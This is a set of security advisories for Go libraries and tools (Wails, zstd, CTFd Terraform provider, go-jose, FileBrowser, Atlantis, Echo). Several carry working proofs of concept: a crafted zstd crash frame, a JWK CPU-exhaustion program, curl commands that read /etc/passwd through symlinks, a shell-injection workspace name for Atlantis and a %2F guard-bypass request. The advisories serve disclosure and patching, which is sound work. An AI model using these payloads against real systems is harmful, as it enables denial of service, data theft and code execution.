### GHSA-47hv-j4px-h3c9 — Wails: wildcardPatternToRegex allows Origin bypass via suffix match in BindingsAllowedOrigins
- Aliases: CVE-2026-34157 | Published: 2026-10-27 | Modified: 2026-10-27 | Severity: HIGH
- CWE: CWE-625
- CVSS_V4: `CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:P/VC:H/VI:H/VA:L/SC:L/SI:L/SA:N`
- Affected Go/github.com/wailsapp/wails/v2: introduced:2.0.0 fixed:2.13.0

# Security Vulnerability Report: Wails v2 — Origin Validator Bypass via Wildcard Pattern

| | |
|---|---|
| **Product** | wailsapp/wails (v2) |
| **Affected File** | `v2/internal/frontend/originvalidator/originValidator.go` |
| **Affected Versions** | All versions containing originValidator (latest as of 2026-03-26) |
| **CVSSv4.0** | **7.6 HIGH** — `CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:P/VC:H/VI:H/VA:L/SC:L/SI:L/SA:N` |
| **CWE** | CWE-625: Permissive Regular Expression |
| **Platforms** | Windows / Linux / macOS (all desktop targets) |

---

## Summary

Wails v2 provides `BindingsAllowedOrigins` to restrict which web origins can invoke Go backend methods via IPC. The wildcard pattern matching in `wildcardPatternToRegex` converts `*` to `.*` without anchoring subcomponents, allowing suffix-matched origins to bypass the restriction.

An attacker who controls a domain sharing a prefix with the allowed origin (e.g., `myapp.community` when `myapp.com*` is configured) can invoke arbitrary bound Go methods, potentially achieving file system access, data exfiltration, or code execution depending on the application's exposed API surface.

---

## Vulnerability Details

### Root Cause

`wildcardPatternToRegex` converts a wildcard pattern to a regular expression by escaping special characters and replacing `*` with `.*`. The substituted `.*` has no restriction — it matches any character sequence including dots and additional domain components.

### Vulnerable Code

**File:** `v2/internal/frontend/originvalidator/originValidator.go`

```go
func (v *OriginValidator) wildcardPatternToRegex(wildcardPattern string) string {
    specialChars := []string{"\\", ".", "+", "?", "^", "$", "{", "}", "(", ")", "|", "[", "]"}

    escaped := wildcardPattern
    for _, specialChar := range specialChars {
        escaped = strings.ReplaceAll(escaped, specialChar, "\\"+specialChar)
    }

    // * becomes .* — matches ANY character sequence, including dots and domain separators
    escaped = strings.ReplaceAll(escaped, "*", ".*")

    return "^" + escaped + "$"
}
```

The generated regex for `https://myapp.com*` is:

```
^https://myapp\.com.*$
```

This matches any string beginning with `https://myapp.com`, including:

- `https://myapp.community` — different TLD
- `https://myapp.com.attacker.com` — attacker-controlled subdomain
- `https://myapp.comXXXXX` — any arbitrary suffix

### Scope Note

The official comment in `options.go` gives `https://*.myapp.com` as the example pattern (subdomain prefix wildcard). This pattern is **not affected**. The vulnerability only manifests when developers use a trailing wildcard (`myapp.com*`), which is a natural misuse when intending to permit a domain and all its subpaths or ports.

---

## Impact

Any Go method registered with Wails bindings becomes callable from the attacker's origin. Depending on the application:

- File system read / write (common in desktop apps)
- Database queries
- OS command execution (if exposed via bindings)
- Sensitive configuration or credential access

---

## Fix

**PR:** https://github.com/wailsapp/wails/pull/5074

Wildcards are now only expanded when they represent a full domain component (immediately after `://`, `.`, or `:`). A wildcard appended to a partial label (e.g. `com*`) is stripped, preventing suffix-based bypasses. Comprehensive test suite added.

---

## Disclosure Timeline

| Date | Event |
|---|---|
| 2026-03-26 | Vulnerability discovered during source code audit by @Saku0512 |
| 2026-03-26 | Private report submitted via GitHub Security Advisory |
| 2026-03-26 | Vendor acknowledgement and fix PR opened (#5074) |
| TBD | Patch release |
| TBD + 90 days | Public disclosure deadline |

References:

- https://github.com/wailsapp/wails/pull/5074 [WEB]
- https://github.com/wailsapp/wails/commit/bcc5941b72fdab6a13942b58871a2696faa85b81 [WEB]
- https://github.com/wailsapp/wails [PACKAGE]

### GHSA-fpmh-frq8-7rj8 — compress zstd: Panic on two-block frames
- Aliases: CVE-2026-116591 | Published: 2026-10-27 | Modified: 2026-10-27 | Severity: HIGH
- CWE: CWE-190
- CVSS_V4: `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N`
- Affected Go/github.com/klauspost/compress/zstd: introduced:0 fixed:1.20.2

### Summary

A crafted ~27 KB two-block zstd frame makes DecodeAll and the streaming decoder panic with an out-of-range slice index instead of returning a decode error. The same bytes decode fine with the reference zstd. Any program that decompresses untrusted zstd input can be crashed by it. Reproduced on v1.20.0 and v1.20.1.

Released in https://github.com/klauspost/compress/releases/tag/v1.20.2

### Details

 The panic is in the FSE decoder that `huff0.ReadTable` uses to read a block's Huffman-weight table. Three conditions have to hold at once, and the crafted frame arranges all three.

  **1. A count that doesn't fit is accepted.** `readNCount` permits a tableLog up to 15 ([`tablelogAbsoluteMax`](https://github.com/klauspost/compress/blob/v1.20.0/fse/decompress.go#L9), checked at [`fse/decompress.go:54`](https://github.com/klauspost/compress/blob/v1.20.0/fse/decompress.go#L54)), so a symbol's normalized count can reach 32768 (2^15). The count is stored in an `int16` at [`fse/decompress.go:126`](https://github.com/klauspost/compress/blob/v1.20.0/fse/decompress.go#L126), where 32768 wraps to −32768. The validation only looks at the `int32` running totals (`remaining` and `gotTotal`), which still match, so the bad value passes. The crafted second block produces `norm = [0, -32768]`, `symbolLen = 2`.

  **2. The decode table is built empty, with no error.** In `buildDtable`, −32768 isn't the −1 that flags a low-probability symbol, so it skips that branch, and the spread loop [`for i := 0; i < int(v); i++`](https://github.com/klauspost/compress/blob/v1.20.0/fse/decompress.go#L221) runs zero times for a negative `v`. `position` never advances, so the [`position != 0`](https://github.com/klauspost/compress/blob/v1.20.0/fse/decompress.go#L230) guard passes as well.

  **3. Stale state from the previous block is reused.** `huff0` shares one `fse.Scratch` across both blocks, and [`allocDtable`](https://github.com/klauspost/compress/blob/v1.20.0/fse/decompress.go#L173-L189) reuses `decTable` and `ct.stateTable` without clearing them. So the table is rebuilt on top of block 1's symbols and `symbolNext` values. Many cells end up with `nbBits == 0`, because the leftover `nextState` is ≥ 32768.

  At decode time, every symbol's count is below `largeLimit`, so `zeroBits` stays false and `decompress` takes the [`nextFast`](https://github.com/klauspost/compress/blob/v1.20.0/fse/decompress.go#L371) path. On a cell with `nbBits == 0`, [`getBitsFast(0)`](https://github.com/klauspost/compress/blob/v1.20.0/fse/bitreader.go#L58-L63) shifts by `(64-0)&63 == 0` and returns the low 16 bits of the whole register instead of 0. The state runs past the end of the table, and [`d.dt[d.state]`](https://github.com/klauspost/compress/blob/v1.20.0/fse/decompress.go#L372) panics:

  ```
  panic: runtime error: index out of range [33077] with length 32768
  ```

  Both blocks are needed. With a fresh `Scratch`, every cell would be symbol 0 with `symbolNext 0`, `highBits(0)` would underflow, `newState` would reach 32768, and the [`newState >= tableSize`](https://github.com/klauspost/compress/blob/v1.20.0/fse/decompress.go#L246) guard would return an error. Block 1's leftover state is what carries the malformed table past that guard.

  The underlying bug is the `int16` storage combined with a tableLog allowed to reach 15. The C reference uses `short` too, but caps the FSE tableLog at 12 and the Huffman-weight tableLog at 6, so the count never wraps. `huff0.ReadTable` doesn't enforce that 6-bit bound.

  A fix: reject a count of `1<<15` (or `nbBits > 14`) in `readNCount`, and enforce the weight-table tableLog in `huff0`. Clearing the reused table would also turn the panic into an error.


### Proof of concept

Run the following repro:

```
package compression

import (
	"bytes"
	"slices"
	"testing"

	"github.com/klauspost/compress/zstd"
	"github.com/stretchr/testify/require"
)

func TestDecodeAll(t *testing.T) {
	// zstdFSEPanic is a crafted two-block zstd frame that makes
	// github.com/klauspost/compress (v1.20.0 and v1.20.1) panic with an
	// out-of-range index in fse.nextFast rather than returning an error. Cross-block
	// FSE table-state carryover lets the second block's malformed Huffman-weight
	// table pass the decoder's guard and overflow the decode table.
	zstdFSEPanic := slices.Concat(
		[]byte{0x28, 0xb5, 0x2f, 0xfd, 0x00, 0x38, 0x74, 0x06, 0x00, 0x42, 0xb8, 0x32, 0x0d, 0x1a, 0x00, 0x00, 0x00, 0x90, 0xaf, 0xfa, 0xff, 0x03, 0x00, 0x80, 0xff, 0x7f},
		bytes.Repeat([]byte{0xa5, 0x94, 0x52, 0x4a, 0x29}, 37),
		[]byte{0xa5, 0x94, 0x12, 0x00, 0xad, 0x56, 0x03, 0xee, 0xff, 0xdf, 0xb3, 0x1a, 0x1c, 0x1a, 0x00, 0xe0, 0xff, 0x1f, 0x0f, 0xb1, 0x9c, 0x5a, 0xcf, 0x4d, 0xe4, 0x1d, 0x7b, 0xab, 0x99, 0x5e, 0x01, 0x51, 0xa4, 0x73, 0xd8, 0xb1, 0xf3, 0x39, 0x4b, 0x67, 0xf6, 0xab, 0x1a, 0xab, 0x1a, 0xab, 0x1a},
		bytes.Repeat([]byte{0x8c, 0x31, 0xc6, 0x18, 0x63}, 1365),
		[]byte{0x8c, 0x31},
		bytes.Repeat([]byte{0x63, 0x8c, 0x31, 0xc6, 0x18}, 1365),
		[]byte{0x63, 0x2c},
		bytes.Repeat([]byte{0x31, 0xc6, 0x18, 0x63, 0x8c}, 1365),
		[]byte{0x31, 0x46},
		bytes.Repeat([]byte{0x31, 0xc6, 0x18, 0x63, 0x8c}, 1365),
		[]byte{0x31, 0x06, 0x00},
	)

	decoder, err := zstd.NewReader(nil)
	require.NoError(t, err)

	dst := make([]byte, 100*1024)
	_, err = decoder.DecodeAll(zstdFSEPanic, dst)
	require.NoError(t, err)
}
```

### GHSA-vg84-c5mg-76xh — CTFer.io's CTFd Terraform Provider allows a local or remote attacker to read team passwords in state as non sensitive values
- Aliases: CVE-2026-116683 | Published: 2026-10-27 | Modified: 2026-10-27 | Severity: HIGH
- CWE: CWE-522
- CVSS_V4: `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:L/SA:N`
- Affected Go/github.com/ctfer-io/terraform-provider-ctfd: introduced:0.1.5 last_affected:1.1.0
- Affected Go/github.com/ctfer-io/terraform-provider-ctfd/v2: introduced:0 fixed:2.8.2

### Impact

CTFer.io's CTFd Terraform Provider stores `ctfd_team.password` as non-sensitive values (CWE-522). A local or remote attacker, who can have access to the Terraform state, can read team passwords without the need for the state password for decryption.

### Patches

Patched in v2.8.2.

### Workarounds

No workaround exist, yet CTFer.io recommends you keep your state in safe environments with a limited set of users who can access it as a good practice to avoid exploitation of this vulnerability.

### GHSA-mgcc-cww5-fp2q — Go JOSE: DoS when parsing JWKs that contain RSA keys
- Aliases: CVE-2026-116587 | Published: 2026-10-27 | Modified: 2026-10-27 | Severity: HIGH
- CWE: CWE-407, CWE-770
- CVSS_V3: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`
- Affected Go/github.com/go-jose/go-jose/v4: introduced:0 fixed:4.1.6
- Affected Go/github.com/go-jose/go-jose/v3: introduced:0 last_affected:3.0.5

### Summary

A crafted RSA key inside a JWK can cause operations that parse JWKs to consume excess CPU.

### Details

go-jose does not check for bounds on RSA modulus and primes before validating them. Values are passed directly to `crypto/rsa.PrivateKey.Validate()`. On Go 1.24+, this takes cubic time complexity with respect to the RSA modulus and primes. This allows an attacker to supply a crafted JWK to consume excessive CPU.

https://github.com/go-jose/go-jose/blob/5b371aecfcf7aabe06068d67da4344591ecddc76/jwk.go#L655-L700

### Proof of concept

No special configuration of go-jose is required to reproduce this vulnerability.

```go
package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"math/big"
	"time"

	"github.com/go-jose/go-jose/v4"
)

func main() {
	// The RSA parameters can be complete junk. The CPU cost is in validating them.
	primeBits := 16384
	p := new(big.Int).Lsh(big.NewInt(1), uint(primeBits-1))
	p.SetBit(p, 0, 1)
	n := new(big.Int).Lsh(big.NewInt(1), 2048)
	e := big.NewInt(65537)
	d := big.NewInt(3)
	q := big.NewInt(3)

	jwk := map[string]string{
		"kty": "RSA",
		"n":   base64.RawURLEncoding.EncodeToString(n.Bytes()),
		"e":   base64.RawURLEncoding.EncodeToString(e.Bytes()),
		"d":   base64.RawURLEncoding.EncodeToString(d.Bytes()),
		"p":   base64.RawURLEncoding.EncodeToString(p.Bytes()),
		"q":   base64.RawURLEncoding.EncodeToString(q.Bytes()),
	}

	protected := map[string]any{
		"alg": "RS256",
		"jwk": jwk,
	}
	protJSON, _ := json.Marshal(protected)

	jws := map[string]string{
		"protected": base64.RawURLEncoding.EncodeToString(protJSON),
		"payload":   base64.RawURLEncoding.EncodeToString([]byte(`{}`)),
		"signature": base64.RawURLEncoding.EncodeToString([]byte("not-a-real-signature")),
	}
	jwsJSON, _ := json.Marshal(jws)

	start := time.Now()
	_, err := jose.ParseSigned(string(jwsJSON), []jose.SignatureAlgorithm{jose.RS256})
	elapsed := time.Since(start)

	fmt.Printf("prime bits: %d\n", primeBits)
	fmt.Printf("parse time: %s\n", elapsed)
	fmt.Printf("parse error: %v\n", err)
}
```

### Impact

Denial of service vulnerability. Any application that uses go-jose to parse JWKs from untrusted sources is affected and should patch immediately.

### Credits

Reported by Yuval Saggie and Mor Weinberger (powered by Echo Frontier)

References:
- https://github.com/go-jose/go-jose/security/advisories/GHSA-mgcc-cww5-fp2q [WEB]
- https://nvd.nist.gov/vuln/detail/CVE-2026-116587 [ADVISORY]
- https://github.com/go-jose/go-jose/commit/a0111f82742fa92bceec9ede40845e73319e6230 [WEB]
- https://github.com/go-jose/go-jose [PACKAGE]
- https://github.com/go-jose/go-jose/releases/tag/v4.1.6 [WEB]

### GHSA-mgqf-5mf5-prfj — FileBrowser: Symlink following escapes user scope allowing arbitrary file read outside the served directory
- Aliases: CVE-2026-116682 | Published: 2026-10-27 | Modified: 2026-10-27 | Severity: HIGH
- CWE: CWE-22, CWE-59
- CVSS_V3: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N`
- Affected Go/github.com/gtsteffaniak/filebrowser/backend: introduced:0 fixed:0.0.0-20260814233832-4126edeb07a0

## Summary

File read paths resolve symbolic links with `filepath.EvalSymlinks` and then operate on the resolved target without re-checking that the target still lies inside the user's source/scope. 

A symlink located inside a user's accessible directory that points outside the scope (for example to `/etc/passwd`, another tenant's directory, SSH keys, or container secrets) is followed transparently, and its contents are served through the normal download, preview, media, and OnlyOffice endpoints. Any authenticated user with download access can read files anywhere the server process can, whenever such a symlink is reachable in their scope. 

The same symlink-following read path is used by the public share endpoints, which are authorized only by a share hash and not by any account, so when a public share exposes a directory that contains such a symlink, an unauthenticated attacker holding only the share link reads files outside the scope with no credential.

## Details

**1. Symlink resolution performs no containment check (`indexing/iteminfo/utils.go:110-119`)**

```go
func ResolveSymlinks(path string) (string, bool, error) {
    resolvedPath, err := filepath.EvalSymlinks(path)   // follows the link to its real target
    if err != nil {
        return path, false, fmt.Errorf("could not resolve symlinks for %s: %v", path, err)
    }
    info, err := os.Lstat(resolvedPath)
    // ...
    return resolvedPath, IsDirectory(info), nil         // returned with no scope validation
}
```

There is no comparison of `resolvedPath` against the index/scope root.

**2. `GetRealPath` returns the resolved target unchecked (`indexing/indexingFiles.go:991-1008`)**

```go
absolutePath, err := filepath.Abs(joinedPath)
// ...
realPath, isDir, err := iteminfo.ResolveSymlinks(absolutePath)   // escapes scope here
// ...
return realPath, isDir, err
```

`realPath` is then used by file handlers to open and serve the file. No caller re-validates that `realPath` is a descendant of the user's source root. (By contrast, the project did add containment for archive extraction via `symlinkTargetStaysUnderDest`, but that guard is specific to extraction and is not applied to this general read path.)

**3. The read handlers request symlink following, including the unauthenticated public-share handlers (`http/resource.go:96,503`, `http/media.go:124`, `http/onlyOffice.go:133`, `http/public.go:279,441,494`)**

```go
FollowSymlinks: true,
```

Authenticated download, preview, media-subtitle, and OnlyOffice read flows all set `FollowSymlinks: true`, and so do the public share handlers in `http/public.go`. The public download route is registered as `publicApi.HandleFunc("GET /resources/download", withHashFile(publicDownloadHandler))` (`http/httpRouter.go:130`), where `withHashFile` authorizes by the share hash alone with no account, so the same escape is reachable with no authentication when a public share exposes a directory containing the symlink.

## PoC

Confirmed live on `gtstef/filebrowser:1.3.3-stable`. A symlink pointing outside the user's directory must exist inside it; here it is placed on the host volume, which is what happens whenever a bind-mounted directory contains symlinks.

**1. Start a fresh container and seed a file outside the user's intended subtree.**
```bash
docker rm -f fb-q-lab 2>/dev/null; rm -rf /tmp/fb-q-lab; mkdir -p /tmp/fb-q-lab/srv/user1
echo "ROOT_DB_PASSWORD=supersecret" > /tmp/fb-q-lab/srv/secret-outside.txt
docker run -d --name fb-q-lab -p 8090:80 -v /tmp/fb-q-lab/srv:/srv gtstef/filebrowser:1.3.3-stable && sleep 8
TARGET_URL=http://localhost:8090
```

**2. Place symlinks inside the served tree that point outside it.** One points at a host file (`/etc/passwd`), one at the file outside the user's subtree.
```bash
docker exec fb-q-lab sh -c 'ln -sf /etc/passwd /srv/user1/passwd_link; ln -sf /srv/secret-outside.txt /srv/user1/secret_link'
```

### Vector 1: authenticated user (any account with download access)

**3. Log in as the default admin** (the token is passed as the `auth` query parameter).
```bash
ADMIN_TOKEN=$(curl -s -X POST "$TARGET_URL/api/auth/login?username=admin" -H "X-Password: admin" | tr -d '"')
```

**4. Download through the symlinks and read files from outside the scope.**
```bash
curl -s "$TARGET_URL/api/resources/download?file=/user1/passwd_link&source=srv&auth=$ADMIN_TOKEN" | head -1
curl -s "$TARGET_URL/api/resources/download?file=/user1/secret_link&source=srv&auth=$ADMIN_TOKEN"
```

Observed output:
```
[passwd_link] root:x:0:0:root:/root:/bin/sh
[secret_link] ROOT_DB_PASSWORD=supersecret
```

### Vector 2: unauthenticated, via a public share (no account)

**5. The owner creates a public share of the directory** (a normal use of the share feature). This is the only step that needs an account.
```bash
SHARE_HASH=$(curl -s -X POST "$TARGET_URL/api/share?auth=$ADMIN_TOKEN" \
  -H 'Content-Type: application/json' -d '{"path":"/user1","source":"srv"}' \
  | python3 -c "import sys,json;print(json.load(sys.stdin)['hash'])")
```

**6. With only the public share hash and no credential, download through the symlink.**
```bash
curl -s "$TARGET_URL/public/api/resources/download?hash=$SHARE_HASH&file=/passwd_link" | head -1
curl -s "$TARGET_URL/public/api/resources/download?hash=$SHARE_HASH&file=/secret_link"
```

Observed output:
```
[passwd_link] root:x:0:0:root:/root:/bin/sh   (HTTP 200)
[secret_link] ROOT_DB_PASSWORD=supersecret
```

Both vectors follow each symlink to its target and return content from outside the served directory.
Vector 1 works for any scoped non-admin user confined to `/user1`.
Vector 2 needs no account at all, only the public share link, which is why the CVSS score uses `PR:N`.

## Impact

- **Arbitrary file read outside scope:** any authenticated user with download access can read any file the server process can access (host configuration, secrets, SSH keys, `/etc/passwd`, container service-account tokens, other tenants' files).
- **Unauthenticated read via public shares:** because the public share download path follows symlinks and is authorized only by the share hash, an attacker with no account reads the same out-of-scope files using only a public share link to a directory that contains such a symlink. This is the `PR:N` worst case driving the score.
- **Cross-tenant data exposure:** in multi-user deployments, one user reads other users' scoped files through a symlink.
- **Broad sink coverage:** the same gap affects authenticated download, preview, media/subtitle, and OnlyOffice read flows and the public share handlers, all of which follow symlinks.
- **Precondition:** a symlink pointing outside the scope must be reachable in the served directory (for the unauthenticated vector, inside a publicly shared directory). This is common where host directories are bind-mounted (the typical Docker deployment) or where scopes overlap shared storage.

## Recommended Fix

After resolving symlinks, verify the resolved real path is still contained within the user's source root, and reject otherwise:

```go
// indexing/indexingFiles.go, GetRealPath, after ResolveSymlinks:
rootReal, _ := filepath.EvalSymlinks(idx.Path)
rel, err := filepath.Rel(rootReal, realPath)
if err != nil || rel == ".." || strings.HasPrefix(rel, ".."+string(os.PathSeparator)) {
    return "", false, fmt.Errorf("resolved path escapes source scope")
}
```

Apply the same containment check (or reuse the existing `symlinkTargetStaysUnderDest` logic) on every read path that sets `FollowSymlinks: true`. As a deployment-hardening option, add a setting to refuse to follow symlinks that leave the source root entirely.

References:
- https://github.com/gtsteffaniak/filebrowser/security/advisories/GHSA-mgqf-5mf5-prfj [WEB]
- https://nvd.nist.gov/vuln/detail/CVE-2026-116682 [ADVISORY]
- https://github.com/gtsteffaniak/filebrowser/pull/2795 [WEB]
- https://github.com/gtsteffaniak/filebrowser/pull/2800 [WEB]
- https://github.com/gtsteffaniak/filebrowser/commit/3c8c02414eefd3351ffe437fa39ff6eb150ffa67 [WEB]
- https://github.com/gtsteffaniak/filebrowser/commit/4126edeb07a015c3809a89249b283e07a4e50c38 [WEB]
- https://github.com/gtsteffaniak/filebrowser [PACKAGE]
- https://github.com/gtsteffaniak/filebrowser/releases/tag/v1.5.2-stable [WEB]
- https://github.com/gtsteffaniak/filebrowser/releases/tag/v2.0.1-beta [WEB]

### GHSA-rjh2-4xgw-p2hj — Atlantis: OS command injection through PR-controlled Terraform workspace enables RCE during plan
- Aliases: CVE-2026-116676 | Published: 2026-10-27 | Modified: 2026-10-27 | Severity: HIGH
- CWE: CWE-78
- CVSS_V3: `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`
- Affected Go/github.com/runatlantis/atlantis: introduced:0.4.0 fixed:0.47.1

### Summary

Atlantis passes the Terraform `workspace` value from a pull request's `atlantis.yaml` into a shell command without quoting or escaping it.

A contributor whose pull request is eligible for an Atlantis plan can include shell metacharacters in the workspace name and execute arbitrary commands as the Atlantis service account. This does not require custom workflows, `allow_custom_workflows`, or permission to run `terraform apply`.

The executed command inherits the Atlantis process environment, which commonly contains cloud-provider, Terraform, and VCS credentials.

### Details

Verified against current `upstream/main` commit `92ce5c51d1a050357e44df3535483425e59fa984` on August 13, 2026.

The vulnerable data flow is:

1. The PR-controlled project workspace is validated in [`server/core/config/raw/project.go`](https://github.com/runatlantis/atlantis/blob/92ce5c51d1a050357e44df3535483425e59fa984/server/core/config/raw/project.go#L139-L149).

   Validation rejects only `..`, `/`, and `\`. Shell metacharacters such as `;`, `#`, `$`, redirections, and whitespace remain permitted.

2. The workspace is passed directly as a Terraform command argument in [`server/core/runtime/workspace_step_runner_delegate.go`](https://github.com/runatlantis/atlantis/blob/92ce5c51d1a050357e44df3535483425e59fa984/server/core/runtime/workspace_step_runner_delegate.go#L86-L96):

   ```go
   []string{workspaceCmd, "select", ctx.Workspace}
   ```

3. Terraform arguments are concatenated into a single string using `strings.Join(args, " ")` in [`server/core/terraform/tfclient/terraform_client.go`](https://github.com/runatlantis/atlantis/blob/92ce5c51d1a050357e44df3535483425e59fa984/server/core/terraform/tfclient/terraform_client.go#L451-L468):

   ```go
   tfCmd := fmt.Sprintf("%s %s", binPath, strings.Join(args, " "))
   ```

4. The resulting string is executed through `sh -c` in [`server/core/terraform/tfclient/terraform_client.go`](https://github.com/runatlantis/atlantis/blob/92ce5c51d1a050357e44df3535483425e59fa984/server/core/terraform/tfclient/terraform_client.go#L416-L427):

   ```go
   cmd := exec.Command("sh", "-c", tfCmd)
   ```

Consequently, a workspace such as:

```text
poc;id;false;#
```

produces commands equivalent to:

```sh
terraform workspace select poc;id;false;#
terraform workspace new poc;id;false;#
```

`raw.Project.Validate()` was confirmed to return no error for this workspace value.

Atlantis documents that planning untrusted Terraform can already be dangerous because providers and external data sources execute code. The distinct issue here is that an ordinary project configuration field becomes shell source, bypassing the explicit `allow_custom_workflows` control and requiring no malicious provider, external data source, custom workflow, or apply operation.

The primary remediation should be to execute Terraform using an argument vector rather than constructing shell source—for example, `exec.Command(binaryPath, args...)`. Any required environment-variable expansion should be performed without invoking a shell. Strict workspace-name validation would also provide defense in depth.

### PoC

Only reproduce this against a disposable Atlantis instance and test repository.

#### Preconditions

- Atlantis processes `atlantis.yaml` from the pull request branch.
- The pull request is eligible to run `atlantis plan`.
- For a fork pull request, the server must have `--allow-fork-prs` enabled. A same-repository branch does not require this flag.
- No custom workflows or apply permissions are required.

#### Repository contents

Create `main.tf`:

```hcl
terraform {
  required_version = ">= 1.0"
}
```

Create `atlantis.yaml`:

```yaml
version: 3
projects:
  - name: workspace-rce-poc
    dir: .
    workspace: "poc;id;false;#"
    autoplan:
      enabled: false
```

Open a pull request containing these files and comment:

```text
atlantis plan -p workspace-rce-poc
```

#### Expected result

Atlantis first runs `terraform workspace select`. The injected `false` causes that command invocation to return an error, so Atlantis retries using `terraform workspace new`.

On both attempts, the shell executes `id` as a separate command. The second failure includes the combined command output in the Atlantis error response, exposing output similar to:

```text
uid=1000(atlantis) gid=1000(atlantis) groups=1000(atlantis)
```

This demonstrates arbitrary shell-command execution without creating a custom workflow or reaching the apply phase.

The payload uses only `id` and `false` and does not access credentials, make network requests, or modify the host beyond Terraform potentially creating the disposable `poc` workspace.

### Impact

This is an OS command injection vulnerability  resulting in remote code execution as the Atlantis service account.

Affected deployments are those that:

- Process pull-request-controlled `atlantis.yaml` project configuration; and
- Permit the attacker-controlled pull request to trigger an Atlantis plan.

Potential consequences include:

- Reading and exfiltrating cloud-provider, Terraform, and VCS credentials inherited from the Atlantis process.
- Accessing Terraform state, plan files, repository checkouts, caches, and other data available to the Atlantis user.
- Modifying files or binaries accessible to the service account.
- Making network requests using the Atlantis server's network identity.
- Pivoting into infrastructure accessible through the server's credentials or network placement.

For public repositories, arbitrary external contributors are directly exposed when `--allow-fork-prs` is enabled. Without fork PR support, the vulnerable population includes users able to create eligible same-repository pull requests and attackers controlling such accounts.

References:
- https://github.com/runatlantis/atlantis/security/advisories/GHSA-rjh2-4xgw-p2hj [WEB]
- https://nvd.nist.gov/vuln/detail/CVE-2026-116676 [ADVISORY]
- https://github.com/runatlantis/atlantis/pull/6792 [WEB]
- https://github.com/runatlantis/atlantis/commit/8dd22b4d0a9d7c129fdbf6a3398dd1c4cf8c3a59 [WEB]
- https://github.com/runatlantis/atlantis/commit/f04df0d53f0544d9eb6f5026dd8b74fbefd82ac8 [WEB]
- https://github.com/runatlantis/atlantis [PACKAGE]
- https://github.com/runatlantis/atlantis/releases/tag/v0.47.1 [WEB]

### GHSA-375p-5qhx-8wq4 — Echo's middleware.Static: `%2F`-encoded path bypasses route/group middleware guarding a statically-served path
- Aliases: CVE-2026-118650 | Published: 2026-10-28 | Modified: 2026-10-28 | Severity: HIGH
- CWE: CWE-177, CWE-863
- CVSS_V3: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`
- Affected Go/github.com/labstack/echo/v5: introduced:0 fixed:5.4.0
- Affected Go/github.com/labstack/echo/v4: introduced:0 fixed:4.16.0

## Summary

When `middleware.Static` is mounted globally (`e.Use(middleware.Static(...))`) and an application relies on a **route- or group-level middleware guard** to restrict a path that also falls under the served static root, a `%2F`-encoded request bypasses that guard while the file is still served. This is the same encoding/decoding mismatch fixed for `StaticFS`/`StaticDirectoryHandler` in CVE-2026-55677 / GHSA-vfp3-v2gw-7wfq, but the fix did not cover the `middleware.Static` path. In addition, the `StaticConfig.EnablePathUnescaping` docstring states the default configuration prevents exactly this bypass, which is inaccurate for the global-mount case.

**This is not path traversal:** no file outside the static root is accessed. The served file lives inside the static root; the issue is that access-control expectations set by a route guard are inconsistent between the literal and `%2F`-encoded forms of the same path.

## Details

Root cause — the router and the static handler disagree on how to interpret `%2F`:

- The router matches routes on the **raw, still-encoded** path, so `GET /admin%2Fsecret.txt` does **not** match a `/admin/...` route or group; any middleware attached to that route/group is therefore skipped.
- `middleware.Static` selects its path source in `middleware/static.go` (~L219): with a global `e.Use` mount there is no wildcard route, so it uses `c.Request().URL.Path`, which `net/http` has already **decoded** (`%2F` → `/`). It then `path.Clean`s (~L235) and `Open`s (~L259) `admin/secret.txt`, serving the file.

Net effect: for the literal path the guard runs; for the `%2F`-encoded path the guard is skipped but the same file is served.

Relevant code:
- `middleware/static.go` ~L219 (`p := c.Request().URL.Path`), ~L235 (`path.Clean`), ~L259 (`currentFS.Open`)
- `StaticConfig.EnablePathUnescaping` docstring (`static.go` ~L60-67) — claims the default prevents the `/admin%2fprivate.txt` → `/admin/*` guard bypass; this is not true for the global mount.

Relationship to prior advisories:
- **CVE-2026-55677 / GHSA-vfp3-v2gw-7wfq** (patched 5.2.0): same `%2F` router-vs-handler mismatch, but fixed for `StaticFS`/`StaticDirectoryHandler`. The `middleware.Static` path was not covered — this report is that gap.
- **CVE-2026-25766 / GHSA-pgvm-wxw2-hrv9** (patched 5.0.3): a *different* issue (Windows backslash traversal **outside** the root). Referenced only to disambiguate; not the same as this report.

## PoC

Environment: `golang:1.25`, module using the official release (`go get github.com/labstack/echo/v5@v5.3.1`, no local `replace`). Static root `public/` contains a marker file `public/admin/secret.txt` = `SECRET`.

Minimal app (the pattern under test: static served globally + a group guard intended to protect `/admin`):

```go
package main

import (
	"net/http"

	"github.com/labstack/echo/v5"
	"github.com/labstack/echo/v5/middleware"
)

func main() {
	e := echo.New()
	e.Use(middleware.Static("public")) // serves ./public globally (default filesystem)

	admin := e.Group("/admin", func(next echo.HandlerFunc) echo.HandlerFunc {
		return func(c *echo.Context) error { return c.String(http.StatusUnauthorized, "auth required") }
	})
	admin.GET("/secret.txt", func(c *echo.Context) error { return c.String(http.StatusOK, "handler") })

	e.Start(":1323")
}
```

Requests (unauthenticated):

```
# Literal: route matches -> group guard runs
curl -i http://localhost:1323/admin/secret.txt
# => 401

# %2F-encoded: route does NOT match -> guard skipped, but middleware.Static serves the file
curl -i --path-as-is http://localhost:1323/admin%2Fsecret.txt
# => 200, body: SECRET
```

Observed on `v5.3.1`: literal → `401`; `%2F` → `200` with the file contents. For contrast, serving via the (patched) `e.StaticFS("/")` returns `404` for the same `%2F` request, showing the `middleware.Static` path was not covered by the CVE-2026-55677 fix.

## Impact

An unauthenticated remote user can retrieve a file served by `middleware.Static` even when the application attached a route/group middleware guard to that path, by substituting `/` with `%2F`. The consequence is limited to files already inside the served static root (CWE-863 authorization inconsistency; CWE-436 interpretation conflict) — **there is no access to files outside the static root**.

